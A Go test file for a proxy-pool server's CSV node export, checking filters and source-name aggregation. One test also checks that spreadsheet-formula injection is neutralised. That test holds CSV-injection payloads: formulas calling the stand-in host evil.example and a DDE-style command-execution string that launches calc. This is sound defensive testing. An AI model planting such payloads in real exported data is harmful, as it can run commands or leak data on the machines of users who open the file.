package main

import (
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestExportFiltersIncludeFullPoolAndAggregateSourceNames(t *testing.T) {
	pool := NewProxyPool()
	changedAvailable := Proxy{
		IP: "198.51.100.10", Port: "1080", Protocol: "socks5", Available: true,
		ExitIP: "203.0.113.10", IPChangeKnown: true, IPChanged: true,
		SourceName: "primary", SourceNames: []string{"feed-a", "feed-b"}, LatencyMs: 10,
	}
	unchangedAvailable := Proxy{
		IP: "198.51.100.11", Port: "8080", Protocol: "http", Available: true,
		ExitIP: "203.0.113.11", IPChangeKnown: true, IPChanged: false, SourceName: "http-feed", LatencyMs: 20,
	}
	changedButUnknown := Proxy{
		IP: "198.51.100.12", Port: "3128", Protocol: "http", Available: false,
		ExitIP: "203.0.113.12", IPChangeKnown: false, IPChanged: true, SourceName: "unknown-feed", LatencyMs: 30,
	}
	changedUnavailable := Proxy{
		IP: "198.51.100.13", Port: "443", Protocol: "https", Available: false,
		ExitIP: "203.0.113.13", IPChangeKnown: true, IPChanged: true, SourceName: "dead-feed", LatencyMs: 40,
	}
	pool.Prime([]Proxy{changedAvailable, unchangedAvailable, changedButUnknown, changedUnavailable}, nil)
	server := NewStatusServer(pool, &ConfigStore{})

	assertExportKeys(t, server.collectExport(httptest.NewRequest(http.MethodGet, "/api/nodes/export", nil)),
		changedAvailable.Key(), unchangedAvailable.Key(), changedButUnknown.Key(), changedUnavailable.Key())
	assertExportKeys(t, server.collectExport(httptest.NewRequest(http.MethodGet, "/api/nodes/export?available=1", nil)),
		changedAvailable.Key(), unchangedAvailable.Key())
	assertExportKeys(t, server.collectExport(httptest.NewRequest(http.MethodGet, "/api/nodes/export?only_changed=1", nil)),
		changedAvailable.Key(), changedUnavailable.Key())
	assertExportKeys(t, server.collectExport(httptest.NewRequest(http.MethodGet, "/api/nodes/export?search=203.0.113.10", nil)),
		changedAvailable.Key())

	recorder := httptest.NewRecorder()
	server.handleNodeExport(recorder, httptest.NewRequest(http.MethodGet, "/api/nodes/export", nil))
	if got, want := recorder.Code, http.StatusOK; got != want {
		t.Fatalf("export status = %d, want %d", got, want)
	}
	records, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(recorder.Body.String(), "\ufeff"))).ReadAll()
	if err != nil {
		t.Fatalf("parse exported CSV: %v", err)
	}
	if got, want := len(records), 5; got != want {
		t.Fatalf("exported CSV rows = %d, want header plus four nodes", got)
	}
	for _, record := range records[1:] {
		if record[1] == changedAvailable.Addr() {
			if got, want := record[17], "feed-a, feed-b"; got != want {
				t.Fatalf("aggregated source column = %q, want %q", got, want)
			}
			return
		}
	}
	t.Fatalf("CSV has no row for %q", changedAvailable.Addr())
}

func assertExportKeys(t *testing.T, nodes []exportNode, wantKeys ...string) {
	t.Helper()
	got := make(map[string]bool, len(nodes))
	for _, node := range nodes {
		got[node.Key()] = true
	}
	if len(got) != len(wantKeys) {
		t.Fatalf("exported keys = %v, want %v", got, wantKeys)
	}
	for _, want := range wantKeys {
		if !got[want] {
			t.Fatalf("exported keys = %v, missing %q", got, want)
		}
	}
}

func TestExportCSVNeutralizesSpreadsheetFormulas(t *testing.T) {
	nodes := []exportNode{{Proxy: Proxy{
		IP: "8.8.8.8", Port: "1080", Protocol: "socks5",
		Username: "=HYPERLINK(\"https://evil.example\")",
		Password: "+cmd|' /C calc'!A0",
		Country:  " @SUM(1,1)", City: "\t=WEBSERVICE(\"https://evil.example\")",
		SourceName: "-malicious-feed",
	}}}
	recorder := httptest.NewRecorder()
	exportCSV(recorder, nodes)
	records, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(recorder.Body.String(), "\ufeff"))).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(records) != 2 {
		t.Fatalf("CSV records = %d", len(records))
	}
	row := records[1]
	for _, column := range []int{4, 5, 10, 11, 17} {
		if !strings.HasPrefix(row[column], "'") {
			t.Errorf("column %d was not neutralized: %q", column, row[column])
		}
	}
	if got := spreadsheetSafeCell("normal value"); got != "normal value" {
		t.Fatalf("safe cell changed: %q", got)
	}
}
